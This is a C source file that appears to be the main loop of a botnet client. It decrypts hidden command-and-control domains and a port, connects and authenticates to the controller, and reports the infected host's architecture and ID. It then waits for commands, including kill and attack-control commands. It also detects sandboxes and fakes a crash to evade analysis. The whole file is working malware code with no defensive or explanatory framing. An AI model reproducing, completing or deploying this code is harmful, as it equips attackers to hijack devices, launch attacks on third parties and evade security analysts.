#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>

#define MODULE_TAG "main"
#include "headers/debug.h"

#include "headers/lifecycle.h"
#include "headers/manager.h"
#include "headers/protocol.h"
#include "headers/dns.h"
#include "headers/table.h"
#include "headers/crypto.h"
#include "headers/rand.h"
#include "headers/mutual_auth.h"
#include "headers/adbg.h"

#define RECV_BUFFER_SIZE 4096
#define PING_TIMEOUT 180
#define HEARTBEAT_INTERVAL 30
#define MAX_RECONNECT_DELAY 300
#define DNS_RETRY_DELAY 5
#define CONNECT_TIMEOUT 15

static int set_socket_timeout(int sockfd, int timeout_sec) {
    struct timeval tv;
    tv.tv_sec = timeout_sec;
    tv.tv_usec = 0;
    return setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
}

static uint32_t resolve_with_retry(const char* domain) {
    uint32_t ip = 0;
    int attempt = 0;

    DEBUG_PRINT("Resolving domain: %s", domain);

    while (running && ip == 0 && attempt < 5) {
        ip = dns_resolve(domain);
        if (ip != 0) {
            struct in_addr addr;
            addr.s_addr = ip;
            char addr_str[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &addr, addr_str, sizeof(addr_str));
            DEBUG_PRINT("DNS resolved to: %s", addr_str);
            break;
        }

        attempt++;
        int delay = DNS_RETRY_DELAY * (attempt < 5 ? attempt : 5);
        DEBUG_PRINT("DNS resolve failed, attempt %d, retrying in %ds", attempt, delay);
        sleep(delay);
    }

    return ip;
}

static int establish_connection(uint32_t cnc_ip) {
    if (cnc_ip == 0) {
        DEBUG_PRINT("establish_connection: invalid IP");
        return -1;
    }

    char *port_str = decrypt(3);
    if (port_str == NULL) {
        DEBUG_PRINT("Failed to decrypt port");
        return -1;
    }
    int cnc_port = atoi(port_str);
    free_secret(port_str);

    if (cnc_port <= 0 || cnc_port > 65535) {
        DEBUG_PRINT("Invalid port number: %d", cnc_port);
        return -1;
    }

    struct in_addr addr;
    addr.s_addr = cnc_ip;
    char addr_str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &addr, addr_str, sizeof(addr_str));
    DEBUG_PRINT("Connecting to CNC: %s:%d", addr_str, cnc_port);

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        DEBUG_PRINT("Socket creation failed: %s", strerror(errno));
        return -1;
    }

    int optval = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

    int flags = fcntl(sockfd, F_GETFL, 0);
    if (flags == -1) {
        DEBUG_PRINT("fcntl F_GETFL failed: %s", strerror(errno));
        close(sockfd);
        return -1;
    }
    if (fcntl(sockfd, F_SETFL, flags | O_NONBLOCK) == -1) {
        DEBUG_PRINT("fcntl F_SETFL failed: %s", strerror(errno));
        close(sockfd);
        return -1;
    }

    struct sockaddr_in servaddr;
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = cnc_ip;
    servaddr.sin_port = htons(cnc_port);

    int ret = connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr));
    
    if (ret < 0) {
        if (errno != EINPROGRESS) {
            DEBUG_PRINT("Connect failed immediately: %s", strerror(errno));
            close(sockfd);
            return -1;
        }
    
        if (sockfd >= FD_SETSIZE) {
            DEBUG_PRINT("sockfd %d >= FD_SETSIZE %d, cannot use select", sockfd, FD_SETSIZE);
            close(sockfd);
            return -1;
        }

        fd_set writefds;
        FD_ZERO(&writefds);
        FD_SET(sockfd, &writefds);
        
        struct timeval tv;
        tv.tv_sec = CONNECT_TIMEOUT;
        tv.tv_usec = 0;
        
        ret = select(sockfd + 1, NULL, &writefds, NULL, &tv);
        
        if (ret <= 0) {
            DEBUG_PRINT("Connect timeout or error: %s", ret == 0 ? "timeout" : strerror(errno));
            close(sockfd);
            return -1;
        }
        
        int error = 0;
        socklen_t len = sizeof(error);
        if (getsockopt(sockfd, SOL_SOCKET, SO_ERROR, &error, &len) < 0 || error != 0) {
            DEBUG_PRINT("Connect failed: %s", strerror(error ? error : errno));
            close(sockfd);
            return -1;
        }
    }

    fcntl(sockfd, F_SETFL, flags);

    DEBUG_PRINT("Connected successfully, sockfd=%d", sockfd);
    set_socket_timeout(sockfd, PING_TIMEOUT);

    return sockfd;
}

static int perform_mutual_auth(int sockfd) {
    auth_context_t auth_ctx;
    uint8_t buffer[512];
    ssize_t len;
    
    memset(buffer, 0, sizeof(buffer));
    auth_init(&auth_ctx);
    
    DEBUG_PRINT("Creating HELLO message");
    len = auth_create_hello(&auth_ctx, buffer);
    if (len < 0) {
        DEBUG_PRINT("Failed to create HELLO message");
        auth_cleanup(&auth_ctx);
        return -1;
    }
    DEBUG_PRINT("HELLO created, len=%zd", len);
    
    if (crypto_send(sockfd, buffer, (size_t)len) < 0) {
        DEBUG_PRINT("Failed to send HELLO");
        auth_cleanup(&auth_ctx);
        return -1;
    }
    DEBUG_PRINT("HELLO sent, waiting for CHALLENGE");
    
    memset(buffer, 0, sizeof(buffer));
    len = crypto_recv(sockfd, buffer, sizeof(buffer));
    if (len <= 0) {
        DEBUG_PRINT("Failed to receive CHALLENGE (len=%zd)", len);
        auth_cleanup(&auth_ctx);
        return -1;
    }
    DEBUG_PRINT("Received %zd bytes, cmd=0x%02X", len, buffer[0]);
    
    if (len < 49) {
        DEBUG_PRINT("CHALLENGE too short: %zd < 49", len);
        auth_cleanup(&auth_ctx);
        return -1;
    }
    
    if (auth_process_challenge(&auth_ctx, buffer, (size_t)len) != 0) {
        DEBUG_PRINT("CHALLENGE verification failed - possible MITM!");
        auth_cleanup(&auth_ctx);
        return -1;
    }
    DEBUG_PRINT("CNC verified, creating AUTH_RESPONSE");
    
    char *secret = decrypt(4);
    if (!secret) {
        DEBUG_PRINT("Failed to decrypt auth secret");
        auth_cleanup(&auth_ctx);
        return -1;
    }
    
    size_t secret_len = strlen(secret);
    DEBUG_PRINT("Auth secret decrypted, len=%zu", secret_len);
    
    if (secret_len == 0 || secret_len > 128) {
        DEBUG_PRINT("Invalid secret length: %zu", secret_len);
        free_secret(secret);
        auth_cleanup(&auth_ctx);
        return -1;
    }
    
    memset(buffer, 0, sizeof(buffer));
    len = auth_create_response(&auth_ctx, secret, secret_len, buffer, sizeof(buffer));
    free_secret(secret);
    
    if (len < 0) {
        DEBUG_PRINT("Failed to create AUTH_RESPONSE");
        auth_cleanup(&auth_ctx);
        return -1;
    }
    DEBUG_PRINT("AUTH_RESPONSE created, len=%zd", len);
    
    if (crypto_send(sockfd, buffer, (size_t)len) < 0) {
        DEBUG_PRINT("Failed to send AUTH_RESPONSE");
        auth_cleanup(&auth_ctx);
        return -1;
    }
    DEBUG_PRINT("AUTH_RESPONSE sent, waiting for AUTH_OK");
    
    memset(buffer, 0, sizeof(buffer));
    len = crypto_recv(sockfd, buffer, sizeof(buffer));
    if (len <= 0) {
        DEBUG_PRINT("Failed to receive AUTH_OK (len=%zd)", len);
        auth_cleanup(&auth_ctx);
        return -1;
    }
    DEBUG_PRINT("Received auth result: cmd=0x%02X, len=%zd", buffer[0], len);
    
    if (auth_process_auth_ok(&auth_ctx, buffer, (size_t)len) != 0) {
        DEBUG_PRINT("Authentication rejected by CNC");
        auth_cleanup(&auth_ctx);
        return -1;
    }
    
    DEBUG_PRINT("Mutual authentication successful!");
    auth_cleanup(&auth_ctx);
    return 0;
}

static int send_identity(int sockfd) {
    uint8_t buffer[128];
    const char* arch = BArch;
    size_t arch_len = strlen(arch);
    const char *uuid = lifecycle_get_uuid();

    if (arch_len > 60) arch_len = 60;

    size_t uuid_len = strlen(uuid);
    if (uuid_len > 16) uuid_len = 16;

    buffer[0] = CMD_IDENTITY;
    buffer[1] = (uint8_t)arch_len;
    memcpy(buffer + 2, arch, arch_len);

    buffer[2 + arch_len] = (uint8_t)uuid_len;
    if (uuid_len > 0) {
        memcpy(buffer + 2 + arch_len + 1, uuid, uuid_len);
    }

    DEBUG_PRINT("Sending identity: arch=%s, uuid=%s", arch, uuid);
    return crypto_send(sockfd, buffer, 2 + arch_len + 1 + uuid_len);
}

static int handle_connection(int sockfd) {
    uint8_t buffer[RECV_BUFFER_SIZE];
    time_t last_ping = time(NULL);
    time_t last_send = time(NULL);

    DEBUG_PRINT("handle_connection started, sockfd=%d", sockfd);
    
    if (sockfd >= FD_SETSIZE) {
        DEBUG_PRINT("sockfd %d >= FD_SETSIZE %d, cannot use select", sockfd, FD_SETSIZE);
        return -1;
    }

    if (perform_mutual_auth(sockfd) < 0) {
        DEBUG_PRINT("Mutual authentication failed");
        return -1;
    }
    last_send = time(NULL);
    
    if (send_identity(sockfd) < 0) {
        DEBUG_PRINT("Identity send failed");
        return -1;
    }
    last_send = time(NULL);

    while (running) {
        fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(sockfd, &readfds);

        struct timeval tv;
        tv.tv_sec = 1;
        tv.tv_usec = 0;

        int ret = select(sockfd + 1, &readfds, NULL, NULL, &tv);

        if (ret < 0) {
            if (errno == EINTR) {
                DEBUG_PRINT("select interrupted, continuing");
                continue;
            }
            DEBUG_PRINT("select error: %s", strerror(errno));
            return -1;
        }

        time_t now = time(NULL);
        if (ret == 0) {
            if (now - last_ping > PING_TIMEOUT) {
                DEBUG_PRINT("Ping timeout after %ld seconds", (long)(now - last_ping));
                return -1;
            }
            if (now - last_send > HEARTBEAT_INTERVAL) {
                DEBUG_PRINT("Sending heartbeat (PONG)");
                if (send_pong(sockfd) != 0) return -1;
                last_send = time(NULL);
            }
            continue;
        }

        if (FD_ISSET(sockfd, &readfds)) {
            ssize_t len = crypto_recv(sockfd, buffer, sizeof(buffer));

            if (len <= 0) {
                DEBUG_PRINT("crypto_recv returned %zd", len);
                return -1;
            }

            DEBUG_PRINT("Received %zd decrypted bytes, cmd_type=0x%02X", len, buffer[0]);
            last_ping = time(NULL);

            int cmd_result = handle_command(sockfd, buffer, len);
            if (cmd_result == -2) {
                DEBUG_PRINT("Received KILL command, exiting connection handler");
                return -2;
            }
            if (cmd_result == -1) return -1;
        }
    }

    DEBUG_PRINT("handle_connection exiting (running=%d)", running);
    return 0;
}

int main(int argc, char** argv) {
    if (lifecycle_init(argc, argv) != 0)
        return 1;

    int delay = 1;
    int table_idx = 0;
    const int domain_ids[] = {0, 1, 2};
    const int num_domains = 3;

    while (running) {
        if (adbg_is_under_analysis()) {
            DEBUG_PRINT("Sandbox detected mid-execution, aborting.");
            adbg_fake_crash_and_chaos();
        }

        int current_id = domain_ids[table_idx];
        char *cnc_domain = decrypt(current_id);
        
        if (!cnc_domain) {
            DEBUG_PRINT("Failed to decrypt CNC domain ID %d", current_id);
            table_idx = (table_idx + 1) % num_domains;
            sleep(1);
            continue;
        }
        
        DEBUG_PRINT("Entering main loop, CNC_DOMAIN[%d]=%s", current_id, cnc_domain);

        uint32_t cnc_ip = resolve_with_retry(cnc_domain);
        free_secret(cnc_domain);

        if (cnc_ip == 0) {
            DEBUG_PRINT("DNS resolution failed for ID %d, trying next domain", current_id);
            table_idx = (table_idx + 1) % num_domains;
            sleep(1); 
            continue;
        }

        int sockfd = establish_connection(cnc_ip);

        if (sockfd < 0) {
            int jitter = rand_next() % (delay / 2 + 1);
            int sleep_time = delay + jitter;
            DEBUG_PRINT("Connection failed, sleeping %ds (delay=%d, jitter=%d)", sleep_time, delay, jitter);
            sleep(sleep_time);
            if (delay < MAX_RECONNECT_DELAY) {
                delay *= 2;
            }
            
            table_idx = (table_idx + 1) % num_domains;
            continue;
        }

        delay = 1;
        table_idx = 0;

        int result = handle_connection(sockfd);
        
        shutdown(sockfd, SHUT_RDWR);
        close(sockfd);

        if (result == -2) {
            lifecycle_handle_kill();
            break;
        }

        DEBUG_PRINT("Connection closed (result=%d), reconnecting...", result);
        stop_all_attacks();
        wait_for_attacks();
        usleep(150000);
        sleep(2);
    }

    lifecycle_shutdown(argv);
    return 0;
}
